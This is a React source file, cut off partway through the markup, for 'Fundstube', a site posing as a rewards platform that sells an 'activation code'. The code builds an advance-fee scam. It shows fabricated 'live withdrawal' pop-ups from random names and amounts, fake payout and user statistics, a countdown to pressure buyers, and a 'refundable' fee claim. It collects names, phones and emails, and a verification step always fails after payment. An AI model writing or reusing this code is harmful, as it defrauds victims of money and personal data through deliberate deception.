import { useState, useEffect } from 'react';
import { 
  Lock, 
  ShieldCheck, 
  Clock, 
  AlertCircle, 
  Phone, 
  User, 
  Copy, 
  CheckCircle2, 
  RefreshCcw,
  Headset,
  Shield, 
  Zap,
  RotateCcw,
  ArrowRight,
  Send,
  X,
  ArrowUpRight,
  Globe
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { HashRouter as Router, Routes, Route, useNavigate, useLocation } from 'react-router-dom';
import AdminPage from './AdminPage';
import UserDashboard from './UserDashboard';

import { api, AdminSettings, Step, FormData, PaymentSubmission } from './utils/api';

// --- Components ---

function MainApp() {
  const [step, setStep] = useState<Step>('landing');
  const [settings, setSettings] = useState<AdminSettings | null>(null);
  const [formData, setFormData] = useState<FormData>({
    fullName: '',
    phone: '',
    email: '',
    country: 'Nigeria'
  });
  const [accessCode, setAccessCode] = useState('');
  const [isValidating, setIsValidating] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(53);
  const [showCommunityPopup, setShowCommunityPopup] = useState(true);
  const [liveActivity, setLiveActivity] = useState<{name: string, amount: number} | null>(null);
  const location = useLocation();
  const navigate = useNavigate();

  useEffect(() => {
    const names = [
      'Oluwaseun', 'Chidi', 'Aminu', 'Fatima', 'Blessing', 'Ibrahim', 'Ejiro', 'Aisha', 'Kazeem', 'Nneka', 'Tunde', 'Zainab', 
      'Abimbola', 'Emeka', 'Yusuf', 'Titilayo', 'Uche', 'Amaka', 'Damilola', 'Bashiru', 'Adaeze', 'Akunna', 'Amarachi', 'Azubuike',
      'Chetachi', 'Chiamaka', 'Chibuike', 'Chidiebere', 'Chidimma', 'Chidinma', 'Chidiogo', 'Chidubem', 'Chiedu', 'Chiemeka', 
      'Chigozie', 'Chijioke', 'Chikere', 'Chinelo', 'Chinwendu', 'Chinweuba', 'Chinwe', 'Chioma', 'Chukwudi', 'Chukwuemeka', 
      'Chukwuma', 'Dibia', 'Ebele', 'Ebuka', 'Ifeanyi', 'Ifeoma', 'Ijeoma', 'Ikechukwu', 'Ikemefuna', 'Kalu', 'Kanayo', 'Kelechi', 
      'Maduabuchi', 'Nkechi', 'Nkiru', 'Nnamdi', 'Nneka', 'Nwosu', 'Obinna', 'Obiora', 'Ogbonna', 'Okechukwu', 'Oluchi', 'Onyebuchi', 
      'Onyedika', 'Onyekachi', 'Onyinyechi', 'Osita', 'Somtochukwu', 'Uchenna', 'Uchechi', 'Ugochukwu', 'Uzoma', 'Uzor', 'Zikora',
      'Abiodun', 'Adebayo', 'Adebowale', 'Adedayo', 'Adekunle', 'Adelani', 'Ademola', 'Adeniyi', 'Adeola', 'Adewale', 'Adewumi', 
      'Ajayi', 'Akande', 'Akanni', 'Alabi', 'Ayodele', 'Babatunde', 'Balogun', 'Bankole', 'Bello', 'Bolanle', 'Dada', 'Dare', 
      'Eniola', 'Fadekemi', 'Falade', 'Folarin', 'Folasade', 'Gbadamosi', 'Idowu', 'Ifedayo', 'Ilori', 'Iyabo', 'Jaiyesimi', 'Jide', 
      'Kehinde', 'Kolawole', 'Kunle', 'Laniyonu', 'Lateef', 'Mobolaji', 'Modupe', 'Morounfolu', 'Odunayo', 'Ogunbanjo', 'Ogundipe', 
      'Olaitan', 'Olanrewaju', 'Olatunji', 'Olawale', 'Olayinka', 'Oloruntoba', 'Olumide', 'Olusegun', 'Olushola', 'Oluyemi', 
      'Omotayo', 'Onanuga', 'Opeyemi', 'Oyebade', 'Oyedepo', 'Oyelowo', 'Oyewole', 'Sade', 'Salami', 'Segun', 'Shodipe', 'Sowande', 
      'Taiwo', 'Temitope', 'Tejumola', 'Tolulope', 'Toyin', 'Tunji', 'Wasiu', 'Yetunde', 'Yinka', 'Abdullahi', 'Abubakar', 'Adamu', 
      'Bashir', 'Bilkisu', 'Danjuma', 'Faruk', 'Habiba', 'Halima', 'Hassan', 'Hussaini', 'Idris', 'Isah', 'Ismail', 'Jamilu', 'Kabiru', 
      'Khadija', 'Lawal', 'Mahmoud', 'Mukhtar', 'Musa', 'Mustafa', 'Nafisat', 'Nasir', 'Rabiu', 'Sadiq', 'Safiya', 'Sahabi', 'Salisu', 
      'Sani', 'Shehu', 'Suleiman', 'Umar', 'Usman', 'Yahaya', 'Yakubu', 'Zakari', 'Aghatise', 'Amenaghawon', 'Efosa', 'Ehis', 
      'Enosakhare', 'Esosa', 'Etinosa', 'Idemudia', 'Isoken', 'Itohan', 'Ivie', 'Nosakhare', 'Osas', 'Osasere', 'Osayande', 'Osemwengie', 
      'Osaze', 'Otasowie', 'Uhunoma', 'Aondover', 'Dooshima', 'Ember', 'Fanen', 'Msughter', 'Ngover', 'Oryina', 'Sewuese', 'Terfa', 
      'Tertsea', 'Vershima', 'Aniekan', 'Archibong', 'Bassey', 'Edet', 'Effiong', 'Ekene', 'Ekong', 'Eno', 'Etim', 'Idiong', 'Ikpong', 
      'Imo', 'Inyang', 'Itoro', 'Mfon', 'Ndueso', 'Nyong', 'Okon', 'Udofia', 'Udo', 'Udoh', 'Ukpong', 'Usen', 'Eseoghene', 'Evi', 
      'Oghenekevwe', 'Oghenetega', 'Omonefe', 'Onome', 'Oreva', 'Ovie', 'Uyoyou', 'Abigail', 'Buchi', 'Chika', 'Daba', 'Ese', 'Funmi', 
      'Gogo', 'Hauwa', 'Inemesit', 'Jemimah', 'Kamsi', 'Ladi', 'Mina', 'Nora', 'Ogechi', 'Praise', 'Quincy', 'Rachael', 'Simi', 
      'Tofunmi', 'Uduak', 'Vera', 'Wale', 'Xavier', 'Yemi', 'Zara', 'Ayomide', 'Boluwatife', 'Chisom', 'Debare', 'Efe', 'Femi', 
      'Goke', 'Hope', 'Iyanu', 'Jotham', 'Kene', 'Lucky', 'Mide', 'Nosa', 'Obi', 'Pere', 'Queen', 'Remi', 'Seyi', 'Tayo', 'Ugo', 
      'Victor', 'Wura', 'Yaro', 'Zion', 'Ayo', 'Boma', 'Chidi', 'Dupe', 'Enyinna', 'Fola', 'Gamba', 'Hosa', 'Ike', 'Jola', 'Koko', 
      'Lekan', 'Musa', 'Nedu', 'Omo', 'Poju', 'Roli', 'Sola', 'Tobi', 'Ubi', 'Voke', 'Wole', 'Yusuph', 'Zaki', 'Amadi', 'Bode', 
      'Chike', 'Dapo', 'Eze', 'Femi', 'Gada', 'Hakeem', 'Idris', 'Jimi', 'Kufre', 'Ladi', 'Mofe', 'Nnamdi', 'Ola', 'Pius', 'Razaq', 
      'Sikiru', 'Tunde', 'Uche', 'Val', 'Wasiu', 'Yaro', 'Zayyad', 'Akon', 'Bayo', 'Coker', 'Dike', 'Efi', 'Fash', 'Gani', 'Hassan', 
      'Ibekwe', 'Jimoh', 'Kano', 'Ladan', 'Muri', 'Nuhu', 'Ojo', 'Pate', 'Rimi', 'Sani', 'Tafa', 'Umar', 'Vatsa', 'Wada', 'Yudu', 'Zaria'
    ];
    
    const interval = setInterval(() => {
      const randomName = names[Math.floor(Math.random() * names.length)];
      const randomAmount = Math.floor(Math.random() * (800000 - 120000 + 1)) + 120000;
      
      setLiveActivity({ name: randomName, amount: randomAmount });
      
      // Hide after 4 seconds
      setTimeout(() => setLiveActivity(null), 4000);
    }, 10000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const loadSettings = async () => {
      try {
        const s = await api.getSettings();
        setSettings(s);
      } catch (err) {
        console.error("Failed to load settings from server:", err);
        setSettings({
          appName: 'Fundstube',
          price: 6900,
          accountNumber: '',
          accountName: '',
          bankName: '',
          remark: '',
          adminPassword: '',
          adminUsdtWallet: '',
          telegramLink: '',
          communityPopupEnabled: false,
          minWithdrawalBank: 1000,
          minWithdrawalUsdt: 5,
          supportCode: '',
          supportEnabled: false
        });
      }
    };
    loadSettings();
  }, [step, location]);

  useEffect(() => {
    if (step === 'secure-payment' && countdown > 0) {
      const timer = setInterval(() => setCountdown(prev => prev - 1), 1000);
      return () => clearInterval(timer);
    }
  }, [step, countdown]);

  useEffect(() => {
    if (step === 'verifying') {
      const timer = setTimeout(() => {
        setStep('failed');
      }, 10000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleNext = (nextStep: Step) => {
    setStep(nextStep);
    window.scrollTo(0, 0);
  };

  const handleValidateCode = (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError(null);
    
    if (accessCode.length !== 5) {
      setLoginError('Please enter a valid 5-digit code');
      return;
    }

    setIsValidating(true);
    
    api.validateCode(accessCode)
      .then(res => {
        setIsValidating(false);
        if (res.valid) {
          sessionStorage.setItem('fundstube_user_auth', 'true');
          sessionStorage.setItem('fundstube_user_code', accessCode);
          navigate('/dashboard');
        } else {
          setLoginError('Invalid Access Code. Please check your code or purchase a new one.');
        }
      })
      .catch((err) => {
        setIsValidating(false);
        setLoginError(`Connection Error: ${err.message || 'Unable to reach API'}`);
        console.error('Login Validation Failed:', err);
      });
  };

  const handlePaymentComplete = () => {
    const currentPrice = settings?.price || 6900;
    const submission: PaymentSubmission = {
      id: Math.random().toString(36).substr(2, 9),
      fullName: formData.fullName,
      phone: formData.phone,
      email: formData.email || 'N/A',
      country: formData.country,
      timestamp: Date.now(),
      price: currentPrice
    };
    
    api.saveSubmission(submission)
      .then(() => handleNext('verifying'))
      .catch(() => handleNext('verifying'));
  };

  const [toast, setToast] = useState<string | null>(null);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setToast('Copied to clipboard');
    setTimeout(() => setToast(null), 2000);
  };

  return (
    <div className="min-h-screen bg-[#050505] font-sans text-white selection:bg-blue-500/30">
      {/* Toast Notification */}
      <AnimatePresence>
        {toast && (
          <motion.div 
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="fixed top-8 left-1/2 -translate-x-1/2 z-[200] px-6 py-3 bg-blue-600 text-white rounded-full font-black text-xs uppercase tracking-widest shadow-2xl shadow-blue-600/20 flex items-center gap-2"
          >
            <CheckCircle2 size={14} />
            {toast}
          </motion.div>
        )}
      </AnimatePresence>

      {/* Web3 Gradient Background */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-[10%] -left-[10%] w-[40%] h-[40%] bg-blue-600/20 blur-[120px] rounded-full" />
        <div className="absolute top-[20%] -right-[10%] w-[30%] h-[30%] bg-purple-600/10 blur-[100px] rounded-full" />
        <div className="absolute -bottom-[10%] left-[20%] w-[50%] h-[50%] bg-blue-900/10 blur-[150px] rounded-full" />
      </div>

      <AnimatePresence>
        {showCommunityPopup && settings?.communityPopupEnabled && (
          <div className="fixed inset-0 z-[300] flex items-center justify-center p-6 bg-black/80 backdrop-blur-md">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="bg-[#111] border border-white/10 rounded-[2.5rem] p-10 max-w-sm w-full text-center shadow-2xl relative overflow-hidden"
            >
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-600 to-indigo-500" />
              <button 
                onClick={() => setShowCommunityPopup(false)}
                className="absolute top-6 right-6 text-slate-500 hover:text-white transition-colors"
              >
                <X size={20} />
              </button>
              
              <div className="w-20 h-20 bg-blue-600/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-blue-500/20">
                <Send size={32} className="text-blue-500 ml-[-4px]" />
              </div>
              
              <h3 className="text-2xl font-black mb-3 uppercase tracking-tighter text-white">Join our community</h3>
              <p className="text-slate-400 font-bold mb-8 leading-relaxed text-sm">
                Join our official Telegram channel to receive instant updates, bonus alerts, and exclusive earning tips.
              </p>

              <div className="space-y-4">
                <a 
                  href={settings?.telegramLink || "https://t.me/fundstube"} 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="w-full py-5 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl font-black text-sm uppercase tracking-widest transition-all shadow-xl shadow-blue-900/20 flex items-center justify-center gap-3"
                >
                  <Send size={18} /> Join Telegram Now
                </a>
                <button 
                  onClick={() => setShowCommunityPopup(false)}
                  className="w-full py-4 bg-white/5 border border-white/10 text-slate-400 hover:text-white rounded-2xl font-black text-xs uppercase tracking-widest transition-all"
                >
                  Dismiss
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Live Activity Notification */}
      <AnimatePresence>
        {liveActivity && (
          <motion.div
            initial={{ opacity: 0, x: -50, scale: 0.9 }}
            animate={{ opacity: 1, x: 0, scale: 1 }}
            exit={{ opacity: 0, x: -50, scale: 0.9 }}
            className="fixed bottom-6 left-6 z-[400] flex items-center gap-4 p-4 bg-[#0a0a0a]/90 backdrop-blur-xl border border-blue-500/20 rounded-2xl shadow-[0_0_30px_rgba(59,130,246,0.1)] overflow-hidden"
          >
            <div className="absolute top-0 left-0 w-1 h-full bg-blue-500" />
            <div className="w-10 h-10 bg-blue-500/10 rounded-full flex items-center justify-center text-blue-500 border border-blue-500/20 shadow-[0_0_15px_rgba(59,130,246,0.2)]">
              <ArrowUpRight size={20} />
            </div>
            <div className="flex flex-col">
              <p className="text-[10px] font-black uppercase tracking-widest text-slate-500">Live Withdrawal</p>
              <p className="text-sm font-bold text-white">
                <span className="text-blue-400">{liveActivity.name}</span> just withdrew <span className="text-emerald-400">₦{liveActivity.amount.toLocaleString()}</span>
              </p>
              <div className="flex items-center gap-1 mt-1">
                <div className="w-1 h-1 bg-emerald-500 rounded-full animate-pulse" />
                <span className="text-[8px] font-black text-slate-600 uppercase tracking-tighter">Verified on Protocol</span>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence mode="wait">
        {step === 'landing' && (
          <motion.div 
            key="landing"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="relative flex flex-col items-center min-h-screen z-10"
          >
            {/* Header / Nav Area */}
            <div className="w-full max-w-5xl px-6 py-6 flex justify-between items-center">
              <div className="flex items-center gap-2">
                <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg">
                  <span className="text-white font-black italic">F</span>
                </div>
                <span className="text-xl font-black tracking-tighter">{settings?.appName || 'Fundstube'}</span>
              </div>
              <div className="hidden md:flex items-center gap-6 text-sm font-bold text-slate-400">
                <a href="#" className="hover:text-white transition-colors">Products</a>
                <a href="#" className="hover:text-white transition-colors">Security</a>
                <a href="#" className="hover:text-white transition-colors">Company</a>
              </div>
            </div>

            {/* Hero Section */}
            <div className="flex flex-col items-center justify-center flex-grow p-6 text-center max-w-4xl mx-auto">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="mb-6 inline-flex items-center gap-2 bg-blue-500/10 border border-blue-500/20 px-4 py-1.5 rounded-full"
              >
                <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse" />
                <span className="text-[10px] font-black uppercase tracking-[0.2em] text-blue-400">Node Network v2.0 Live</span>
              </motion.div>
              
              <h1 className="text-5xl md:text-7xl font-black mb-6 tracking-tighter bg-clip-text text-transparent bg-gradient-to-b from-white to-white/60 leading-tight">
                Smart Earnings. <br/>
                <span className="text-blue-500">Premium Rewards.</span>
              </h1>
              
              <p className="text-lg md:text-xl text-slate-400 mb-10 max-w-2xl leading-relaxed">
                {settings?.appName || 'Fundstube'} is a next-generation digital rewards ecosystem built with enterprise-grade security, transparent payouts, and high-value opportunities.
              </p>

              {/* Stats Bar */}
              <div className="grid grid-cols-3 gap-4 md:gap-12 mb-12 py-8 px-10 bg-white/[0.02] border border-white/5 rounded-[2.5rem] backdrop-blur-sm">
                <div className="text-center">
                  <div className="text-2xl font-black text-white">₦2.4B+</div>
                  <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mt-1">Total Payouts</div>
                </div>
                <div className="border-x border-white/5 text-center">
                  <div className="text-2xl font-black text-white">120K+</div>
                  <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mt-1">Active Users</div>
                </div>
                <div className="text-center">
                  <div className="text-2xl font-black text-white">99.9%</div>
                  <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mt-1">Uptime</div>
                </div>
              </div>

              {/* Login / Secure Access Card */}
              <div className="w-full max-w-md bg-white/5 backdrop-blur-xl border border-white/10 p-8 rounded-[2.5rem] shadow-2xl">
                <h2 className="text-xl font-black mb-6 tracking-tight">Secure Access</h2>
                <div className="space-y-4">
                   <form onSubmit={handleValidateCode} className="space-y-4 text-left">
                    <div className="relative group">
                      <Lock className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                      <input 
                        type="text" 
                        maxLength={5}
                        required
                        value={accessCode}
                        onChange={(e) => {
                          setAccessCode(e.target.value.replace(/\D/g, ''));
                          setLoginError(null);
                        }}
                        placeholder="Enter 5-digit Fundstube code"
                        className="w-full pl-14 pr-6 py-5 bg-white/5 border border-white/10 rounded-2xl outline-none transition-all placeholder:text-slate-600 font-bold text-center tracking-[0.5em]"
                      />
                    </div>

                    {loginError && (
                      <motion.div 
                        initial={{ opacity: 0, y: -10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="p-4 bg-red-500/10 border border-red-500/20 rounded-xl flex items-center gap-3 text-red-500 text-[10px] font-black uppercase tracking-tight"
                      >
                        <AlertCircle size={14} className="shrink-0" />
                        {loginError}
                      </motion.div>
                    )}

                    <button 
                      type="submit"
                      disabled={isValidating}
                      className="w-full bg-blue-600 hover:bg-blue-500 text-white py-5 rounded-2xl font-black text-lg transition-all shadow-[0_0_30px_rgba(37,99,235,0.2)] disabled:opacity-50"
                    >
                      {isValidating ? 'Validating Node...' : 'Login to Dashboard'}
                    </button>
                  </form>
                  <p className="text-slate-500 text-[11px] font-medium">
                    Protected by Fundstube Security • <a href="#" className="text-blue-500 hover:underline">Privacy</a>
                  </p>
                </div>
              </div>

              {/* Get Code CTA */}
              <button 
                onClick={() => handleNext('select-country')}
                className="mt-10 group flex items-center gap-2 text-slate-400 hover:text-white transition-colors font-black text-sm uppercase tracking-widest"
              >
                No access? <span className="text-blue-500 group-hover:underline underline-offset-4">Get your Fundstube code</span> 
                <ArrowRight size={16} className="group-hover:translate-x-1 transition-transform" />
              </button>
            </div>

            {/* Footer Area */}
            <div className="w-full py-10 flex flex-col items-center gap-4 border-t border-white/5 bg-white/[0.01]">
               <div className="flex justify-center gap-8 opacity-20">
                  <div className="h-6 w-24 bg-white/20 rounded" />
                  <div className="h-6 w-24 bg-white/20 rounded" />
                  <div className="h-6 w-24 bg-white/20 rounded" />
               </div>
               <p className="text-[10px] font-black uppercase tracking-[0.3em] text-slate-500">
                 Protected by {settings?.appName || 'Fundstube'} Security
               </p>
               <button 
                 onClick={() => navigate('/admin')}
                 className="mt-4 px-6 py-2 border border-white/10 rounded-full text-[10px] font-black uppercase tracking-widest text-slate-500 hover:text-white hover:bg-white/5 transition-all"
               >
                 Access Admin Portal
               </button>
            </div>
          </motion.div>
        )}

        {step === 'select-country' && (
          <motion.div 
            key="select-country"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="relative max-w-md mx-auto min-h-screen p-6 flex flex-col justify-center z-10"
          >
            <div className="bg-white/5 backdrop-blur-xl border border-white/10 p-8 rounded-[2.5rem] shadow-2xl">
              <h2 className="text-2xl font-black mb-8 text-center bg-gradient-to-r from-white to-white/60 bg-clip-text text-transparent">
                Region Selection
              </h2>
              
              <div className="space-y-4">
                <button 
                  onClick={() => setFormData({...formData, country: 'Nigeria'})}
                  className={`w-full flex items-center p-5 rounded-2xl transition-all border-2 ${
                    formData.country === 'Nigeria' 
                      ? 'bg-blue-600/10 border-blue-500/50 shadow-[0_0_20px_rgba(59,130,246,0.1)]' 
                      : 'bg-white/[0.02] border-white/5 hover:bg-white/5'
                  }`}
                >
                  <div className="w-12 h-9 mr-4 rounded overflow-hidden shadow-lg border border-white/10">
                    <img src="https://flagcdn.com/w80/ng.png" alt="Nigeria" className="w-full h-full object-cover" />
                  </div>
                  <span className="font-black text-xl flex-grow tracking-tight text-left">Nigeria</span>
                  {formData.country === 'Nigeria' && (
                    <div className="bg-blue-500 rounded-full p-1.5 shadow-[0_0_10px_rgba(59,130,246,0.5)]">
                      <CheckCircle2 size={18} className="text-white" />
                    </div>
                  )}
                </button>

                <button 
                  onClick={() => setFormData({...formData, country: 'Other Countries'})}
                  className={`w-full flex items-center p-5 rounded-2xl transition-all border-2 ${
                    formData.country === 'Other Countries' 
                      ? 'bg-blue-600/10 border-blue-500/50 shadow-[0_0_20px_rgba(59,130,246,0.1)]' 
                      : 'bg-white/[0.02] border-white/5 hover:bg-white/5'
                  }`}
                >
                  <div className="w-12 h-12 mr-4 rounded-full bg-white/5 flex items-center justify-center border border-white/10">
                    <Globe className="text-slate-400" size={24} />
                  </div>
                  <span className="font-black text-xl flex-grow tracking-tight text-left">Other Countries</span>
                  {formData.country === 'Other Countries' && (
                    <div className="bg-blue-500 rounded-full p-1.5 shadow-[0_0_10px_rgba(59,130,246,0.5)]">
                      <CheckCircle2 size={18} className="text-white" />
                    </div>
                  )}
                </button>

                <button 
                  onClick={() => handleNext('purchase-pass')}
                  className="w-full bg-blue-600 hover:bg-blue-500 text-white py-5 rounded-2xl font-black text-lg shadow-[0_0_30px_rgba(37,99,235,0.3)] transition-all mt-6"
                >
                  Continue
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {step === 'purchase-pass' && (
          <motion.div 
            key="purchase-pass"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="relative max-w-md mx-auto min-h-screen p-6 z-10"
          >
            <div className="py-8 bg-white/5 backdrop-blur-2xl border border-white/10 p-8 rounded-[2.5rem] mt-4 shadow-2xl">
              <h2 className="text-3xl font-black mb-3 tracking-tight">Purchase Access Pass</h2>
              <p className="text-slate-400 text-sm mb-10 leading-relaxed">
                Complete the form below. Your Fundstube access code will be reviewed and delivered immediately after payment confirmation.
              </p>

              <div className="space-y-6">
                <div>
                  <label className="block text-xs font-black text-slate-500 uppercase tracking-widest mb-3 ml-1">Full Name</label>
                  <div className="relative group">
                    <User className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-500 group-focus-within:text-blue-400 transition-colors" size={20} />
                    <input 
                      type="text" 
                      placeholder="Enter your full name"
                      className="w-full pl-14 pr-6 py-5 bg-white/5 border border-white/10 rounded-2xl focus:border-blue-500/50 focus:bg-white/[0.08] outline-none transition-all placeholder:text-slate-600 font-bold"
                      value={formData.fullName}
                      onChange={(e) => setFormData({...formData, fullName: e.target.value})}
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-black text-slate-500 uppercase tracking-widest mb-3 ml-1">Phone Number</label>
                  <div className="relative group">
                    <Phone className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-500 group-focus-within:text-blue-400 transition-colors" size={20} />
                    <input 
                      type="tel" 
                      placeholder="0800 000 0000"
                      className="w-full pl-14 pr-6 py-5 bg-white/5 border border-white/10 rounded-2xl focus:border-blue-500/50 focus:bg-white/[0.08] outline-none transition-all placeholder:text-slate-600 font-bold"
                      value={formData.phone}
                      onChange={(e) => setFormData({...formData, phone: e.target.value})}
                    />
                  </div>
                </div>

                <div className="bg-gradient-to-r from-blue-600/20 to-indigo-600/20 p-5 rounded-2xl border border-blue-500/30 flex justify-between items-center">
                  <span className="text-slate-300 font-bold">Code activation fee</span>
                  <span className="text-2xl font-black text-blue-400">₦{settings?.price.toLocaleString() || '---'}</span>
                </div>

                <button 
                  onClick={() => handleNext('secure-payment')}
                  disabled={!formData.fullName || !formData.phone}
                  className="w-full bg-white text-black py-5 rounded-2xl font-black text-lg shadow-[0_0_30px_rgba(255,255,255,0.1)] hover:bg-slate-100 transition-all disabled:opacity-20 disabled:cursor-not-allowed"
                >
                  Proceed to Secure Payment
                </button>

                <div className="bg-amber-500/10 p-5 rounded-2xl border border-amber-500/20 flex gap-4">
                  <AlertCircle className="text-amber-500 shrink-0" size={22} />
                  <p className="text-xs text-amber-200/80 leading-relaxed">
                    <strong className="text-amber-500">Important:</strong> A one-time payment of #{settings?.price.toLocaleString() || '---'} is required to activate your Fundstube dashboard. 
                    This is a <span className="underline decoration-amber-500/50 underline-offset-2">refundable activation fee</span> withdrawable after your first access.
                  </p>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {step === 'secure-payment' && (
          <motion.div 
            key="secure-payment"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="relative max-w-md mx-auto min-h-screen p-6 z-10"
          >
            <div className="py-6">
              <div className="text-center mb-10">
                <h2 className="text-[10px] font-black tracking-[0.4em] text-blue-500 uppercase mb-4">ENCRYPTED GATEWAY</h2>
                <div className="relative inline-block">
                  <motion.div 
                    animate={{ scale: [1, 1.1, 1] }}
                    transition={{ duration: 1, repeat: Infinity }}
                    className="absolute inset-0 bg-blue-600/20 blur-xl rounded-full"
                  />
                  <div className="relative text-6xl font-black text-white drop-shadow-2xl">{countdown}</div>
                </div>
              </div>

              <div className="bg-white/5 backdrop-blur-3xl rounded-[2.5rem] p-8 border border-white/10 shadow-2xl overflow-hidden relative">
                <div className="absolute top-0 right-0 w-32 h-32 bg-blue-600/10 blur-3xl -mr-16 -mt-16" />
                
                <div className="text-center mb-8 relative">
                  <div className="inline-flex p-4 bg-blue-600/20 rounded-2xl mb-4 border border-blue-500/20">
                    <ShieldCheck className="text-blue-400" size={32} />
                  </div>
                  <h3 className="text-xl font-black mb-1">Activation Payment</h3>
                  <p className="text-slate-400 text-sm">Verify your wallet and complete activation.</p>
                </div>

                <div className="flex justify-between items-center mb-10 py-5 border-y border-white/5">
                  <span className="text-slate-500 font-bold uppercase text-[10px] tracking-widest">Activation Code Fee</span>
                  <span className="text-3xl font-black text-white">#{settings?.price.toLocaleString() || '---'}</span>
                </div>

                <div className="space-y-6 mb-10">
                  <div className="group">
                    <label className="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">FULL NAME</label>
                    <input 
                      type="text" 
                      className="w-full py-4 bg-white/5 border border-white/10 rounded-2xl outline-none font-bold px-6 focus:border-blue-500/50 transition-all"
                      value={formData.fullName}
                      onChange={(e) => setFormData({...formData, fullName: e.target.value})}
                    />
                  </div>
                  <div className="group">
                    <label className="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">EMAIL ADDRESS</label>
                    <input 
                      type="email" 
                      placeholder="you@example.com"
                      className="w-full py-4 bg-white/5 border border-white/10 rounded-2xl outline-none font-bold px-6 focus:border-blue-500/50 transition-all placeholder:text-slate-700"
                      value={formData.email}
                      onChange={(e) => setFormData({...formData, email: e.target.value})}
                    />
                  </div>
                </div>

                <button 
                  onClick={() => handleNext('transfer-details')}
                  className="w-full bg-blue-600 hover:bg-blue-500 text-white py-5 rounded-2xl font-black text-lg shadow-[0_0_40px_rgba(37,99,235,0.25)] transition-all flex items-center justify-center gap-3"
                >
                  Proceed to Payment <ArrowRight size={20} />
                </button>
              </div>

              <div className="grid grid-cols-3 gap-6 mt-10">
                <div className="flex flex-col items-center gap-2">
                  <div className="p-2 rounded-lg bg-white/5 border border-white/5 text-slate-500">
                    <Lock size={18} />
                  </div>
                  <span className="text-[10px] font-black text-slate-500 uppercase tracking-tighter">Secured</span>
                </div>
                <div className="flex flex-col items-center gap-2">
                   <div className="p-2 rounded-lg bg-white/5 border border-white/5 text-slate-500">
                    <Zap size={18} />
                  </div>
                  <span className="text-[10px] font-black text-slate-500 uppercase tracking-tighter">Instant</span>
                </div>
                <div className="flex flex-col items-center gap-2">
                   <div className="p-2 rounded-lg bg-white/5 border border-white/5 text-slate-500">
                    <RotateCcw size={18} />
                  </div>
                  <span className="text-[10px] font-black text-slate-500 uppercase tracking-tighter">Refundable</span>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {step === 'transfer-details' && (
          <motion.div 
            key="transfer-details"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="relative max-w-md mx-auto min-h-screen z-10 flex flex-col"
          >
            <div className="bg-white/5 backdrop-blur-3xl p-8 pb-0 border-b border-white/10 rounded-t-[2.5rem] mt-4">
              <div className="flex flex-col items-center mb-6">
                <span className="text-slate-500 text-[10px] font-black uppercase tracking-widest mb-2">Amount to Pay</span>
                <div className="flex items-center gap-2">
                  <span className="text-4xl font-black text-white">
                    {formData.country === 'Nigeria' ? `₦${settings?.price?.toLocaleString() || '---'}` : `$${Math.ceil((settings?.price || 6900) / 1500)}`}
                  </span>
                  {formData.country !== 'Nigeria' && <span className="text-xs text-slate-500 font-bold uppercase tracking-widest mt-2">USDT</span>}
                </div>
                <span className="text-blue-400 text-xs font-bold mt-2 tracking-wide">{formData.email || 'user@example.com'}</span>
              </div>
              
              <div className="flex items-center justify-center gap-2 text-amber-500 bg-amber-500/10 py-2.5 px-5 rounded-full mb-8 mx-auto w-fit border border-amber-500/20 shadow-[0_0_15px_rgba(245,158,11,0.1)]">
                <Clock size={16} className="animate-pulse" />
                <span className="text-xs font-black uppercase tracking-widest">Awaiting Payment</span>
              </div>

              <div className="flex border-b border-white/5">
                <div className="flex-1 py-4 text-center text-[10px] font-black uppercase tracking-widest text-slate-600">Details</div>
                <div className="flex-1 py-4 text-center text-[10px] font-black uppercase tracking-widest text-blue-500 border-b-2 border-blue-500">
                  {formData.country === 'Nigeria' ? 'Transfer' : 'Crypto'}
                </div>
                <div className="flex-1 py-4 text-center text-[10px] font-black uppercase tracking-widest text-slate-600">Confirm</div>
              </div>
            </div>

            <div className="p-6 bg-white/[0.02] backdrop-blur-2xl flex-grow rounded-b-[2.5rem] border-x border-b border-white/10 mb-10 shadow-2xl">
